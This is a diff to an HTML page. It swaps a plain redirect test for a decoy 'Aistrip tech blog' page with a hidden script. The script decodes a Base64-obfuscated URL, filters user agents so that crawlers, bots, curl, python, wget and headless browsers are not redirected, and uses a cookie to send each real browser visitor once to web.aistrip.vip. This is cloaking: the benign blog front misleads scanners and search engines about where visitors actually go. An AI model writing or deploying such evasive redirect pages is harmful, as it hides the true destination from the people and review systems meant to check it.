@@ -2,16 +2,100 @@
 <html lang="zh">
 <head>
   <meta charset="UTF-8">
-  <title>跳转测试</title>
+  <title>Aistrip 技术博客</title>
+  <meta name="description" content="分享前端开发、AI接口部署、反爬策略等技术经验。">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      font-family: "Helvetica Neue", sans-serif;
+      background-color: #f9f9f9;
+      color: #333;
+      max-width: 960px;
+      margin: 0 auto;
+      padding: 40px 20px;
+    }
+    header {
+      text-align: center;
+      margin-bottom: 40px;
+    }
+    .cover {
+      width: 100%;
+      max-height: 240px;
+      object-fit: cover;
+      border-radius: 8px;
+    }
+    nav {
+      margin-top: 20px;
+    }
+    nav a {
+      margin: 0 12px;
+      text-decoration: none;
+      color: #0078d4;
+      font-weight: bold;
+    }
+    h1 {
+      font-size: 2em;
+      margin-bottom: 0.5em;
+    }
+    p {
+      line-height: 1.8;
+      margin-bottom: 1em;
+    }
+    .footer {
+      margin-top: 60px;
+      font-size: 0.9em;
+      color: #999;
+      text-align: center;
+    }
+  </style>
 </head>
 <body>
-  <h1>跳转测试页面</h1>
-  <p>页面将在 3 秒后跳转到目标地址。</p>
+  <header>
+    <img src="cover.jpg" alt="博客封面" class="cover">
+    <nav>
+      <a href="index.html">首页</a>
+      <a href="posts.html">文章</a>
+      <a href="comments.html">评论</a>
+      <a href="about.html">关于我们</a>
+    </nav>
+  </header>
+
+  <main>
+    <h1>欢迎来到 Aistrip 技术博客</h1>
+    <p>我们专注于前端国际化改造、AI接口部署、反爬策略研究与跳板页架构优化。</p>
+    <p>本博客正在维护中，预计将在 2025 年底上线正式内容。</p>
+    <p>如果您是受邀用户，系统将自动跳转至服务平台。</p>
+  </main>
+
+  <div class="footer">
+    &copy; 2025 Aistrip | 技术驱动 · 安全优先
+  </div>
 
   <script>
-    setTimeout(() => {
-      window.location.href = "https://web.aistrip.vip";
-    }, 3000);
+    // ✅ Base64 加密跳转地址
+    const _x1 = 'aHR0cHM6Ly93ZWIuYWlzdHJpcC52aXA='; // https://web.aistrip.vip
+    const _y2 = atob(_x1);
+
+    // ✅ UA 判断（仅对浏览器跳转）
+    const ua = navigator.userAgent.toLowerCase();
+    const isBrowser = /chrome|safari|firefox|edge|opera|mobile/.test(ua);
+    const isBot = /bot|spider|crawler|curl|python|wget|headless/.test(ua);
+
+    // ✅ Cookie 检查（防止重复跳转）
+    const visited = document.cookie.includes('visited=true');
+
+    // ✅ 跳转函数
+    const redirect = () => {
+      if (isBrowser && !isBot && !visited) {
+        document.cookie = 'visited=true; max-age=3600';
+        window.location.href = _y2;
+      }
+    };
+
+    // ✅ 页面加载后延迟跳转
+    document.addEventListener('DOMContentLoaded', () => {
+      setTimeout(redirect, 3000);
+    });
   </script>
 </body>
 </html>
